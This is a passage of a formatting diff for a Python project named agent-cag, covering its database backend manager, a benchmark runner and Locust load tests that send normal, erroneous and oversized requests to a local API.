query_id=record[\"q.id\"],\n-                    response_id=record[\"r.id\"],\n-                    query_text=record[\"q.text\"],\n-                    response_text=record[\"r.text\"],\n-                    timestamp=record[\"q.created_at\"].isoformat(),\n-                    input_type=record[\"q.input_type\"]\n-                ))\n-            \n+                history.append(\n+                    ConversationEntry(\n+                        query_id=record[\"q.id\"],\n+                        response_id=record[\"r.id\"],\n+                        query_text=record[\"q.text\"],\n+                        response_text=record[\"r.text\"],\n+                        timestamp=record[\"q.created_at\"].isoformat(),\n+                        input_type=record[\"q.input_type\"],\n+                    )\n+                )\n+\n             return history\n-    \n+\n     async def search_similar(self, query: str, limit: int) -> List[SearchResult]:\n         \"\"\"Search for similar content using ChromaDB.\"\"\"\n         collection = self.chroma_client.get_collection(\"agent_embeddings\")\n-        \n-        results = collection.query(\n-            query_texts=[query],\n-            n_results=limit\n-        )\n-        \n+\n+        results = collection.query(query_texts=[query], n_results=limit)\n+\n         search_results = []\n         if results[\"documents\"]:\n             for i, doc in enumerate(results[\"documents\"][0]):\n-                search_results.append(SearchResult(\n-                    id=results[\"ids\"][0][i],\n-                    text=doc,\n-                    score=1.0 - results[\"distances\"][0][i]  # Convert distance to similarity\n-                ))\n-        \n+                search_results.append(\n+                    SearchResult(\n+                        id=results[\"ids\"][0][i],\n+                        text=doc,\n+                        score=1.0\n+                        - results[\"distances\"][0][i],  # Convert distance to similarity\n+                    )\n+                )\n+\n         return search_results\n \n \n class DatabaseManager:\n     \"\"\"Database manager that selects the appropriate backend.\"\"\"\n-    \n+\n     def __init__(self, deployment_profile: str):\n         self.deployment_profile = deployment_profile\n-        \n+\n         if deployment_profile == \"lightweight\":\n             self.backend = DuckDBBackend()\n         elif deployment_profile == \"full\":\n             self.backend = FullStackBackend()\n         else:\n             raise ValueError(f\"Unknown deployment profile: {deployment_profile}\")\n-    \n+\n     async def initialize(self):\n         \"\"\"Initialize the selected backend.\"\"\"\n         await self.backend.initialize()\n-    \n+\n     async def close(self):\n         \"\"\"Close the backend.\"\"\"\n         await self.backend.close()\n-    \n+\n     async def health_check(self):\n         \"\"\"Check backend health.\"\"\"\n         await self.backend.health_check()\n-    \n+\n     async def store_query(self, text: str, user_id: str, input_type: str) -> str:\n         \"\"\"Store a query.\"\"\"\n         return await self.backend.store_query(text, user_id, input_type)\n-    \n-    async def store_response(self, query_id: str, text: str, metadata: Dict[str, Any]) -> str:\n+\n+    async def store_response(\n+        self, query_id: str, text: str, metadata: Dict[str, Any]\n+    ) -> str:\n         \"\"\"Store a response.\"\"\"\n         return await self.backend.store_response(query_id, text, metadata)\n-    \n-    async def get_user_history(self, user_id: str, limit: int) -> List[ConversationEntry]:\n+\n+    async def get_user_history(\n+        self, user_id: str, limit: int\n+    ) -> List[ConversationEntry]:\n         \"\"\"Get user history.\"\"\"\n         return await self.backend.get_user_history(user_id, limit)\n-    \n+\n     async def search_similar(self, query: str, limit: int) -> List[SearchResult]:\n         \"\"\"Search for similar content.\"\"\"\n-        return await self.backend.search_similar(query, limit)\n\\ No newline at end of file\n+        return await self.backend.search_similar(query, limit)\n--- /home/pas/source/agent-cag/tts/__init__.py\t2025-06-20 18:41:16.840091+00:00\n+++ /home/pas/source/agent-cag/tts/__init__.py\t2025-06-20 19:24:34.320565+00:00\n@@ -1 +1 @@\n-\"\"\"TTS (Text-to-Speech) service package.\"\"\"\n\\ No newline at end of file\n+\"\"\"TTS (Text-to-Speech) service package.\"\"\"\n--- /home/pas/source/agent-cag/benchmark/run_benchmarks.py\t2025-06-20 16:21:22.320104+00:00\n+++ /home/pas/source/agent-cag/benchmark/run_benchmarks.py\t2025-06-20 19:24:34.385037+00:00\n@@ -15,341 +15,355 @@\n import argparse\n \n \n class BenchmarkRunner:\n     \"\"\"Runs performance benchmarks against the Agent CAG system.\"\"\"\n-    \n+\n     def __init__(self, base_url: str = \"http://localhost:8000\"):\n         self.base_url = base_url\n         self.results = {\n             \"timestamp\": datetime.now().isoformat(),\n             \"base_url\": base_url,\n-            \"tests\": {}\n+            \"tests\": {},\n         }\n-    \n+\n     async def run_all_benchmarks(self) -> Dict[str, Any]:\n         \"\"\"Run all benchmark tests.\"\"\"\n         print(\"Starting Agent CAG Performance Benchmarks...\")\n-        \n+\n         # Test individual endpoints\n         await self.benchmark_health_checks()\n         await self.benchmark_query_processing()\n         await self.benchmark_speech_synthesis()\n         await self.benchmark_search_functionality()\n         await self.benchmark_concurrent_load()\n-        \n+\n         # Generate summary\n         self.generate_summary()\n-        \n+\n         return self.results\n-    \n+\n     async def benchmark_health_checks(self):\n         \"\"\"Benchmark health check endpoints.\"\"\"\n         print(\"Benchmarking health checks...\")\n-        \n+\n         endpoints = [\n             (\"API\", f\"{self.base_url}/health\"),\n             (\"ASR\", \"http://localhost:8001/health\"),\n             (\"LLM\", \"http://localhost:8002/health\"),\n             (\"TTS\", \"http://localhost:8003/health\"),\n             (\"Sardaukar\", \"http://localhost:8004/api/health\"),\n         ]\n-        \n+\n         results = {}\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for service_name, url in endpoints:\n                 times = []\n                 success_count = 0\n-                \n+\n                 for _ in range(10):\n                     start_time = time.time()\n                     try:\n                         response = await client.get(url, timeout=5.0)\n                         end_time = time.time()\n-                        \n+\n                         if response.status_code == 200:\n                             success_count += 1\n                             times.append(end_time - start_time)\n                     except Exception:\n                         pass\n-                \n+\n                 if times:\n                     results[service_name] = {\n                         \"avg_response_time\": statistics.mean(times),\n                         \"min_response_time\": min(times),\n                         \"max_response_time\": max(times),\n                         \"success_rate\": success_count / 10,\n-                        \"total_requests\": 10\n+                        \"total_requests\": 10,\n                     }\n-        \n+\n         self.results[\"tests\"][\"health_checks\"] = results\n-    \n+\n     async def benchmark_query_processing(self):\n         \"\"\"Benchmark query processing performance.\"\"\"\n         print(\"Benchmarking query processing...\")\n-        \n+\n         test_queries = [\n             \"What is artificial intelligence?\",\n             \"Explain machine learning in simple terms.\",\n             \"How do neural networks work?\",\n             \"What are the benefits of deep learning?\",\n-            \"Describe natural language processing.\"\n+            \"Describe natural language processing.\",\n         ]\n-        \n+\n         times = []\n         success_count = 0\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for i, query in enumerate(test_queries):\n                 start_time = time.time()\n                 try:\n                     response = await client.post(\n                         f\"{self.base_url}/query\",\n                         json={\n                             \"text\": query,\n                             \"user_id\": f\"benchmark-user-{i}\",\n-                            \"generate_speech\": False\n+                            \"generate_speech\": False,\n                         },\n-                        timeout=30.0\n+                        timeout=30.0,\n                     )\n                     end_time = time.time()\n-                    \n+\n                     if response.status_code == 200:\n                         success_count += 1\n                         times.append(end_time - start_time)\n-                        \n+\n                         # Extract additional metrics\n                         data = response.json()\n                         print(f\"Query {i+1}: {end_time - start_time:.2f}s\")\n-                        \n+\n                 except Exception as e:\n                     print(f\"Query {i+1} failed: {e}\")\n-        \n+\n         if times:\n             self.results[\"tests\"][\"query_processing\"] = {\n                 \"avg_response_time\": statistics.mean(times),\n                 \"min_response_time\": min(times),\n                 \"max_response_time\": max(times),\n-                \"p95_response_time\": statistics.quantiles(times, n=20)[18] if len(times) >= 20 else max(times),\n+                \"p95_response_time\": (\n+                    statistics.quantiles(times, n=20)[18]\n+                    if len(times) >= 20\n+                    else max(times)\n+                ),\n                 \"success_rate\": success_count / len(test_queries),\n-                \"total_requests\": len(test_queries)\n+                \"total_requests\": len(test_queries),\n             }\n-    \n+\n     async def benchmark_speech_synthesis(self):\n         \"\"\"Benchmark speech synthesis performance.\"\"\"\n         print(\"Benchmarking speech synthesis...\")\n-        \n+\n         test_texts = [\n             \"Hello, this is a test.\",\n             \"The quick brown fox jumps over the lazy dog.\",\n             \"Artificial intelligence is transforming our world.\",\n         ]\n-        \n+\n         times = []\n         success_count = 0\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for i, text in enumerate(test_texts):\n                 start_time = time.time()\n                 try:\n                     response = await client.post(\n                         \"http://localhost:8003/synthesize\",\n-                        json={\n-                            \"text\": text,\n-                            \"use_sardaukar\": False\n-                        },\n-                        timeout=20.0\n+                        json={\"text\": text, \"use_sardaukar\": False},\n+                        timeout=20.0,\n                     )\n                     end_time = time.time()\n-                    \n+\n                     if response.status_code == 200:\n                         success_count += 1\n                         times.append(end_time - start_time)\n                         print(f\"TTS {i+1}: {end_time - start_time:.2f}s\")\n-                        \n+\n                 except Exception as e:\n                     print(f\"TTS {i+1} failed: {e}\")\n-        \n+\n         if times:\n             self.results[\"tests\"][\"speech_synthesis\"] = {\n                 \"avg_response_time\": statistics.mean(times),\n                 \"min_response_time\": min(times),\n                 \"max_response_time\": max(times),\n                 \"success_rate\": success_count / len(test_texts),\n-                \"total_requests\": len(test_texts)\n+                \"total_requests\": len(test_texts),\n             }\n-    \n+\n     async def benchmark_search_functionality(self):\n         \"\"\"Benchmark search performance.\"\"\"\n         print(\"Benchmarking search functionality...\")\n-        \n+\n         search_queries = [\n             \"machine learning\",\n             \"artificial intelligence\",\n             \"neural networks\",\n             \"deep learning\",\n-            \"natural language\"\n+            \"natural language\",\n         ]\n-        \n+\n         times = []\n         success_count = 0\n-        \n+\n         async with httpx.AsyncClient() as client:\n             for i, query in enumerate(search_queries):\n                 start_time = time.time()\n                 try:\n                     response = await client.get(\n                         f\"{self.base_url}/search\",\n                         params={\"query\": query, \"limit\": 5},\n-                        timeout=10.0\n+                        timeout=10.0,\n                     )\n                     end_time = time.time()\n-                    \n+\n                     if response.status_code == 200:\n                         success_count += 1\n                         times.append(end_time - start_time)\n                         print(f\"Search {i+1}: {end_time - start_time:.2f}s\")\n-                        \n+\n                 except Exception as e:\n                     print(f\"Search {i+1} failed: {e}\")\n-        \n+\n         if times:\n             self.results[\"tests\"][\"search\"] = {\n                 \"avg_response_time\": statistics.mean(times),\n                 \"min_response_time\": min(times),\n                 \"max_response_time\": max(times),\n                 \"success_rate\": success_count / len(search_queries),\n-                \"total_requests\": len(search_queries)\n+                \"total_requests\": len(search_queries),\n             }\n-    \n+\n     async def benchmark_concurrent_load(self):\n         \"\"\"Benchmark concurrent load handling.\"\"\"\n         print(\"Benchmarking concurrent load...\")\n-        \n+\n         concurrent_users = [1, 5, 10]\n-        \n+\n         for user_count in concurrent_users:\n             print(f\"Testing with {user_count} concurrent users...\")\n-            \n+\n             async def make_request(user_id: int):\n                 async with httpx.AsyncClient() as client:\n                     start_time = time.time()\n                     try:\n                         response = await client.post(\n                             f\"{self.base_url}/query\",\n                             json={\n                                 \"text\": f\"Test query from user {user_id}\",\n                                 \"user_id\": f\"load-test-user-{user_id}\",\n-                                \"generate_speech\": False\n+                                \"generate_speech\": False,\n                             },\n-                            timeout=30.0\n+                            timeout=30.0,\n                         )\n                         end_time = time.time()\n-                        \n+\n                         return {\n                             \"success\": response.status_code == 200,\n                             \"response_time\": end_time - start_time,\n-                            \"user_id\": user_id\n+                            \"user_id\": user_id,\n                         }\n                     except Exception as e:\n                         return {\n                             \"success\": False,\n                             \"response_time\": None,\n                             \"user_id\": user_id,\n-                            \"error\": str(e)\n+                            \"error\": str(e),\n                         }\n-            \n+\n             # Execute concurrent requests\n             start_time = time.time()\n             tasks = [make_request(i) for i in range(user_count)]\n             results = await asyncio.gather(*tasks)\n             end_time = time.time()\n-            \n+\n             # Analyze results\n             successful_results = [r for r in results if r[\"success\"]]\n-            response_times = [r[\"response_time\"] for r in successful_results if r[\"response_time\"]]\n-            \n+            response_times = [\n+                r[\"response_time\"] for r in successful_results if r[\"response_time\"]\n+            ]\n+\n             self.results[\"tests\"][f\"concurrent_load_{user_count}\"] = {\n                 \"concurrent_users\": user_count,\n                 \"total_time\": end_time - start_time,\n                 \"success_rate\": len(successful_results) / user_count,\n-                \"avg_response_time\": statistics.mean(response_times) if response_times else None,\n+                \"avg_response_time\": (\n+                    statistics.mean(response_times) if response_times else None\n+                ),\n                 \"max_response_time\": max(response_times) if response_times else None,\n-                \"throughput\": len(successful_results) / (end_time - start_time)\n+                \"throughput\": len(successful_results) / (end_time - start_time),\n             }\n-    \n+\n     def generate_summary(self):\n         \"\"\"Generate benchmark summary.\"\"\"\n         summary = {\n             \"total_tests\": len(self.results[\"tests\"]),\n-            \"overall_health\": \"healthy\" if all(\n-                test.get(\"success_rate\", 0) > 0.8 \n-                for test in self.results[\"tests\"].values() \n-                if isinstance(test, dict) and \"success_rate\" in test\n-            ) else \"degraded\"\n+            \"overall_health\": (\n+                \"healthy\"\n+                if all(\n+                    test.get(\"success_rate\", 0) > 0.8\n+                    for test in self.results[\"tests\"].values()\n+                    if isinstance(test, dict) and \"success_rate\" in test\n+                )\n+                else \"degraded\"\n+            ),\n         }\n-        \n+\n         # Calculate average response times across all tests\n         all_response_times = []\n         for test_name, test_data in self.results[\"tests\"].items():\n             if isinstance(test_data, dict) and \"avg_response_time\" in test_data:\n                 all_response_times.append(test_data[\"avg_response_time\"])\n-        \n+\n         if all_response_times:\n-            summary[\"avg_response_time_across_all_tests\"] = statistics.mean(all_response_times)\n-        \n+            summary[\"avg_response_time_across_all_tests\"] = statistics.mean(\n+                all_response_times\n+            )\n+\n         self.results[\"summary\"] = summary\n-    \n+\n     def save_results(self, filename: str = None):\n         \"\"\"Save benchmark results to file.\"\"\"\n         if filename is None:\n             timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n             filename = f\"benchmark/results/benchmark_results_{timestamp}.json\"\n-        \n+\n         import os\n+\n         os.makedirs(os.path.dirname(filename), exist_ok=True)\n-        \n-        with open(filename, 'w') as f:\n+\n+        with open(filename, \"w\") as f:\n             json.dump(self.results, f, indent=2)\n-        \n+\n         print(f\"Results saved to {filename}\")\n         return filename\n \n \n async def main():\n     \"\"\"Main benchmark execution.\"\"\"\n     parser = argparse.ArgumentParser(description=\"Run Agent CAG benchmarks\")\n-    parser.add_argument(\"--url\", default=\"http://localhost:8000\", help=\"Base URL for API\")\n+    parser.add_argument(\n+        \"--url\", default=\"http://localhost:8000\", help=\"Base URL for API\"\n+    )\n     parser.add_argument(\"--output\", help=\"Output file for results\")\n-    \n+\n     args = parser.parse_args()\n-    \n+\n     runner = BenchmarkRunner(args.url)\n-    \n+\n     try:\n         results = await runner.run_all_benchmarks()\n-        \n+\n         # Save results\n         output_file = runner.save_results(args.output)\n-        \n+\n         # Print summary\n-        print(\"\\n\" + \"=\"*50)\n+        print(\"\\n\" + \"=\" * 50)\n         print(\"BENCHMARK SUMMARY\")\n-        print(\"=\"*50)\n+        print(\"=\" * 50)\n         print(f\"Total tests: {results['summary']['total_tests']}\")\n         print(f\"Overall health: {results['summary']['overall_health']}\")\n-        \n+\n         if \"avg_response_time_across_all_tests\" in results[\"summary\"]:\n             avg_time = results[\"summary\"][\"avg_response_time_across_all_tests\"]\n             print(f\"Average response time: {avg_time:.3f}s\")\n-        \n+\n         print(f\"Results saved to: {output_file}\")\n-        \n+\n     except KeyboardInterrupt:\n         print(\"\\nBenchmark interrupted by user\")\n     except Exception as e:\n         print(f\"Benchmark failed: {e}\")\n \n \n if __name__ == \"__main__\":\n-    asyncio.run(main())\n\\ No newline at end of file\n+    asyncio.run(main())\n--- /home/pas/source/agent-cag/tests/load/test_load.py\t2025-06-20 18:17:11.736078+00:00\n+++ /home/pas/source/agent-cag/tests/load/test_load.py\t2025-06-20 19:24:34.435449+00:00\n@@ -9,18 +9,18 @@\n from locust.exception import StopUser\n \n \n class AgentCAGUser(HttpUser):\n     \"\"\"Simulated user for load testing Agent CAG system.\"\"\"\n-    \n+\n     wait_time = between(1, 5)  # Wait 1-5 seconds between requests\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize user session.\"\"\"\n         self.user_id = f\"load_test_user_{random.randint(1000, 9999)}\"\n         self.query_count = 0\n-        \n+\n         # Test data for various scenarios\n         self.text_queries = [\n             \"What is artificial intelligence?\",\n             \"How does machine learning work?\",\n             \"Explain neural networks\",\n@@ -28,411 +28,380 @@\n             \"How can I learn programming?\",\n             \"What is the weather like today?\",\n             \"Tell me a joke\",\n             \"What is the meaning of life?\",\n             \"How do computers work?\",\n-            \"What is quantum computing?\"\n+            \"What is quantum computing?\",\n         ]\n-        \n+\n         self.complex_queries = [\n             \"Explain the differences between supervised, unsupervised, and reinforcement learning in machine learning, and provide examples of when each would be most appropriate to use.\",\n             \"What are the ethical implications of artificial intelligence in healthcare, and how can we ensure AI systems are fair and unbiased?\",\n             \"Describe the architecture of a transformer model and explain how attention mechanisms work in natural language processing.\",\n             \"How do convolutional neural networks process images, and what are the key components like pooling layers and activation functions?\",\n-            \"What is the difference between strong AI and weak AI, and what are the current limitations preventing us from achieving artificial general intelligence?\"\n+            \"What is the difference between strong AI and weak AI, and what are the current limitations preventing us from achieving artificial general intelligence?\",\n         ]\n-    \n+\n     @task(10)\n     def query_text(self):\n         \"\"\"Test text query endpoint - most common operation.\"\"\"\n         query_text = random.choice(self.text_queries)\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json={\n-                \"text\": query_text,\n-                \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n-            },\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\n+            \"/query\",\n+            json={\"text\": query_text, \"user_id\": self.user_id, \"input_type\": \"text\"},\n+            catch_response=True,\n+        )\n+\n         if response.status_code == 200:\n             self.query_count += 1\n             response.success()\n         elif response.status_code in [400, 422]:\n             # Client errors are expected for some test cases\n             response.success()\n         else:\n             response.failure(f\"Unexpected status code: {response.status_code}\")\n-    \n+\n     @task(3)\n     def query_complex(self):\n         \"\"\"Test complex query handling.\"\"\"\n         query_text = random.choice(self.complex_queries)\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json={\n-                \"text\": query_text,\n-                \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n-            },\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\n+            \"/query\",\n+            json={\"text\": query_text, \"user_id\": self.user_id, \"input_type\": \"text\"},\n+            catch_response=True,\n+        )\n+\n         if response.status_code == 200:\n             self.query_count += 1\n             response.success()\n         elif response.status_code in [400, 422]:\n             response.success()\n         else:\n             response.failure(f\"Complex query failed: {response.status_code}\")\n-    \n+\n     @task(2)\n     def get_history(self):\n         \"\"\"Test history retrieval.\"\"\"\n         if self.query_count > 0:  # Only if user has made queries\n-            response = self.client.get(\n-                f\"/history/{self.user_id}\",\n-                catch_response=True\n-            )\n-            \n+            response = self.client.get(f\"/history/{self.user_id}\", catch_response=True)\n+\n             if response.status_code in [200, 404]:\n                 response.success()\n             else:\n                 response.failure(f\"History retrieval failed: {response.status_code}\")\n-    \n+\n     @task(1)\n     def search_similar(self):\n         \"\"\"Test similarity search.\"\"\"\n-        search_query = random.choice(self.text_queries[:5])  # Use shorter queries for search\n-        \n+        search_query = random.choice(\n+            self.text_queries[:5]\n+        )  # Use shorter queries for search\n+\n         response = self.client.get(\n-            f\"/search\",\n-            params={\"q\": search_query, \"limit\": 5},\n-            catch_response=True\n-        )\n-        \n+            f\"/search\", params={\"q\": search_query, \"limit\": 5}, catch_response=True\n+        )\n+\n         if response.status_code in [200, 404]:\n             response.success()\n         else:\n             response.failure(f\"Search failed: {response.status_code}\")\n-    \n+\n     @task(1)\n     def health_check(self):\n         \"\"\"Test health check endpoint.\"\"\"\n         response = self.client.get(\"/health\", catch_response=True)\n-        \n+\n         if response.status_code == 200:\n             response.success()\n         else:\n             response.failure(f\"Health check failed: {response.status_code}\")\n-    \n+\n     @task(1)\n     def metrics_check(self):\n         \"\"\"Test metrics endpoint.\"\"\"\n         response = self.client.get(\"/metrics\", catch_response=True)\n-        \n+\n         if response.status_code == 200:\n             response.success()\n         else:\n             response.failure(f\"Metrics check failed: {response.status_code}\")\n \n \n class HeavyUser(HttpUser):\n     \"\"\"Heavy user simulation for stress testing.\"\"\"\n-    \n+\n     wait_time = between(0.1, 1)  # Very short wait times\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize heavy user session.\"\"\"\n         self.user_id = f\"heavy_user_{random.randint(1000, 9999)}\"\n         self.request_count = 0\n-    \n+\n     @task\n     def rapid_queries(self):\n         \"\"\"Make rapid queries to stress test the system.\"\"\"\n         query_text = f\"Stress test query {self.request_count}\"\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json={\n-                \"text\": query_text,\n-                \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n-            },\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\n+            \"/query\",\n+            json={\"text\": query_text, \"user_id\": self.user_id, \"input_type\": \"text\"},\n+            catch_response=True,\n+        )\n+\n         self.request_count += 1\n-        \n+\n         if response.status_code in [200, 400, 422, 429, 503]:\n             # Accept rate limiting and service unavailable as success\n             response.success()\n         else:\n             response.failure(f\"Stress test failed: {response.status_code}\")\n-        \n+\n         # Stop after 100 requests to prevent infinite load\n         if self.request_count >= 100:\n             raise StopUser()\n \n \n class AudioUser(HttpUser):\n     \"\"\"User simulation for audio processing endpoints.\"\"\"\n-    \n+\n     wait_time = between(2, 8)  # Longer wait for audio processing\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize audio user session.\"\"\"\n         self.user_id = f\"audio_user_{random.randint(1000, 9999)}\"\n-        \n+\n         # Create dummy audio data for testing\n         self.audio_data = b\"RIFF\" + b\"\\x00\" * 44 + b\"dummy audio data\" * 100\n-    \n+\n     @task(5)\n     def upload_audio(self):\n         \"\"\"Test audio upload and processing.\"\"\"\n-        files = {\n-            \"audio\": (\"test_audio.wav\", self.audio_data, \"audio/wav\")\n-        }\n-        data = {\n-            \"user_id\": self.user_id\n-        }\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            files=files,\n-            data=data,\n-            catch_response=True\n-        )\n-        \n+        files = {\"audio\": (\"test_audio.wav\", self.audio_data, \"audio/wav\")}\n+        data = {\"user_id\": self.user_id}\n+\n+        response = self.client.post(\n+            \"/query\", files=files, data=data, catch_response=True\n+        )\n+\n         if response.status_code in [200, 400, 422]:\n             response.success()\n         else:\n             response.failure(f\"Audio upload failed: {response.status_code}\")\n-    \n+\n     @task(1)\n     def tts_request(self):\n         \"\"\"Test text-to-speech functionality.\"\"\"\n         response = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"Convert this text to speech\",\n                 \"user_id\": self.user_id,\n                 \"input_type\": \"text\",\n-                \"output_format\": \"audio\"\n+                \"output_format\": \"audio\",\n             },\n-            catch_response=True\n-        )\n-        \n+            catch_response=True,\n+        )\n+\n         if response.status_code in [200, 400, 422]:\n             response.success()\n         else:\n             response.failure(f\"TTS request failed: {response.status_code}\")\n \n \n class DatabaseStressUser(HttpUser):\n     \"\"\"User simulation for database stress testing.\"\"\"\n-    \n+\n     wait_time = between(0.5, 2)\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize database stress user.\"\"\"\n         self.user_id = f\"db_stress_user_{random.randint(1000, 9999)}\"\n         self.queries_made = []\n-    \n+\n     @task(8)\n     def create_data(self):\n         \"\"\"Create data to stress database.\"\"\"\n         query_text = f\"Database stress test query {len(self.queries_made)} - {random.randint(1, 1000000)}\"\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json={\n-                \"text\": query_text,\n-                \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n-            },\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\n+            \"/query\",\n+            json={\"text\": query_text, \"user_id\": self.user_id, \"input_type\": \"text\"},\n+            catch_response=True,\n+        )\n+\n         if response.status_code == 200:\n             self.queries_made.append(query_text)\n             response.success()\n         elif response.status_code in [400, 422]:\n             response.success()\n         else:\n             response.failure(f\"Data creation failed: {response.status_code}\")\n-    \n+\n     @task(3)\n     def read_history(self):\n         \"\"\"Read user history to stress database reads.\"\"\"\n         if self.queries_made:\n             response = self.client.get(\n                 f\"/history/{self.user_id}\",\n                 params={\"limit\": random.randint(5, 20)},\n-                catch_response=True\n+                catch_response=True,\n             )\n-            \n+\n             if response.status_code in [200, 404]:\n                 response.success()\n             else:\n                 response.failure(f\"History read failed: {response.status_code}\")\n-    \n+\n     @task(2)\n     def search_data(self):\n         \"\"\"Search data to stress database queries.\"\"\"\n         if self.queries_made:\n             search_term = random.choice(self.queries_made).split()[0]\n-            \n+\n             response = self.client.get(\n                 \"/search\",\n                 params={\"q\": search_term, \"limit\": random.randint(3, 10)},\n-                catch_response=True\n+                catch_response=True,\n             )\n-            \n+\n             if response.status_code in [200, 404]:\n                 response.success()\n             else:\n                 response.failure(f\"Search failed: {response.status_code}\")\n \n \n class ErrorGeneratingUser(HttpUser):\n     \"\"\"User that generates various error conditions for testing.\"\"\"\n-    \n+\n     wait_time = between(1, 3)\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize error generating user.\"\"\"\n         self.user_id = f\"error_user_{random.randint(1000, 9999)}\"\n-    \n+\n     @task(3)\n     def invalid_json(self):\n         \"\"\"Send invalid JSON to test error handling.\"\"\"\n         invalid_data = '{\"text\": \"test\", \"user_id\": \"test\", invalid}'\n-        \n+\n         response = self.client.post(\n             \"/query\",\n             data=invalid_data,\n             headers={\"Content-Type\": \"application/json\"},\n-            catch_response=True\n-        )\n-        \n+            catch_response=True,\n+        )\n+\n         if response.status_code == 422:  # Expected error\n             response.success()\n         else:\n             response.failure(f\"Invalid JSON handling failed: {response.status_code}\")\n-    \n+\n     @task(2)\n     def missing_fields(self):\n         \"\"\"Send requests with missing required fields.\"\"\"\n         incomplete_data = {\"text\": \"test query\"}  # Missing user_id\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json=incomplete_data,\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\"/query\", json=incomplete_data, catch_response=True)\n+\n         if response.status_code == 422:  # Expected validation error\n             response.success()\n         else:\n             response.failure(f\"Missing fields handling failed: {response.status_code}\")\n-    \n+\n     @task(2)\n     def large_payload(self):\n         \"\"\"Send very large payloads.\"\"\"\n         large_text = \"A\" * 50000  # 50KB text\n-        \n-        response = self.client.post(\n-            \"/query\",\n-            json={\n-                \"text\": large_text,\n-                \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n-            },\n-            catch_response=True\n-        )\n-        \n+\n+        response = self.client.post(\n+            \"/query\",\n+            json={\"text\": large_text, \"user_id\": self.user_id, \"input_type\": \"text\"},\n+            catch_response=True,\n+        )\n+\n         if response.status_code in [200, 400, 413, 422]:\n             response.success()\n         else:\n             response.failure(f\"Large payload handling failed: {response.status_code}\")\n-    \n+\n     @task(1)\n     def nonexistent_endpoints(self):\n         \"\"\"Access nonexistent endpoints.\"\"\"\n         endpoints = [\"/nonexistent\", \"/api/v2/query\", \"/admin\", \"/debug\"]\n         endpoint = random.choice(endpoints)\n-        \n+\n         response = self.client.get(endpoint, catch_response=True)\n-        \n+\n         if response.status_code == 404:  # Expected error\n             response.success()\n         else:\n-            response.failure(f\"404 handling failed for {endpoint}: {response.status_code}\")\n+            response.failure(\n+                f\"404 handling failed for {endpoint}: {response.status_code}\"\n+            )\n \n \n class ConcurrentUser(HttpUser):\n     \"\"\"User for testing concurrent access patterns.\"\"\"\n-    \n+\n     wait_time = between(0.1, 0.5)  # Very fast requests\n-    \n+\n     def on_start(self):\n         \"\"\"Initialize concurrent user.\"\"\"\n         self.user_id = f\"concurrent_user_{random.randint(1000, 9999)}\"\n         self.shared_resource_id = \"shared_resource_123\"\n-    \n+\n     @task(5)\n     def concurrent_queries(self):\n         \"\"\"Make concurrent queries that might access shared resources.\"\"\"\n         response = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": f\"Concurrent access test for {self.shared_resource_id}\",\n                 \"user_id\": self.user_id,\n-                \"input_type\": \"text\"\n+                \"input_type\": \"text\",\n             },\n-            catch_response=True\n-        )\n-        \n+            catch_response=True,\n+        )\n+\n         if response.status_code in [200, 400, 422, 429]:\n             response.success()\n         else:\n             response.failure(f\"Concurrent query failed: {response.status_code}\")\n-    \n+\n     @task(2)\n     def concurrent_history_access(self):\n         \"\"\"Access history concurrently.\"\"\"\n         response = self.client.get(\n-            f\"/history/{self.shared_resource_id}\",\n-            catch_response=True\n-        )\n-        \n+            f\"/history/{self.shared_resource_id}\", catch_response=True\n+        )\n+\n         if response.status_code in [200, 404, 429]:\n             response.success()\n         else:\n-            response.failure(f\"Concurrent history access failed: {response.status_code}\")\n+            response.failure(\n+                f\"Concurrent history access failed: {response.status_code}\"\n+            )\n \n \n # Custom load test scenarios\n class LoadTestScenarios:\n     \"\"\"Custom load test scenarios for specific testing needs.\"\"\"\n-    \n+\n     @staticmethod\n     def run_spike_test():\n         \"\"\"Simulate sudden traffic spike.\"\"\"\n         # This would be implemented as a custom locust test\n         pass\n-    \n+\n     @staticmethod\n     def run_endurance_test():\n         \"\"\"Run long-duration endurance test.\"\"\"\n         # This would be implemented as a custom locust test\n         pass\n-    \n+\n     @staticmethod\n     def run_capacity_test():\n         \"\"\"Test system capacity limits.\"\"\"\n         # This would be implemented as a custom locust test\n         pass\n@@ -440,26 +409,28 @@\n \n # Load test configuration\n if __name__ == \"__main__\":\n     \"\"\"\n     Run load tests with different user classes:\n-    \n+\n     # Basic load test\n     locust -f tests/load/test_load.py --users 10 --spawn-rate 2 --host http://localhost:8000\n-    \n+\n     # Heavy load test\n     locust -f tests/load/test_load.py --users 50 --spawn-rate 5 --host http://localhost:8000 HeavyUser\n-    \n+\n     # Audio processing test\n     locust -f tests/load/test_load.py --users 5 --spawn-rate 1 --host http://localhost:8000 AudioUser\n-    \n+\n     # Database stress test\n     locust -f tests/load/test_load.py --users 20 --spawn-rate 3 --host http://localhost:8000 DatabaseStressUser\n-    \n+\n     # Error handling test\n     locust -f tests/load/test_load.py --users 10 --spawn-rate 2 --host http://localhost:8000 ErrorGeneratingUser\n-    \n+\n     # Concurrent access test\n     locust -f tests/load/test_load.py --users 30 --spawn-rate 10 --host 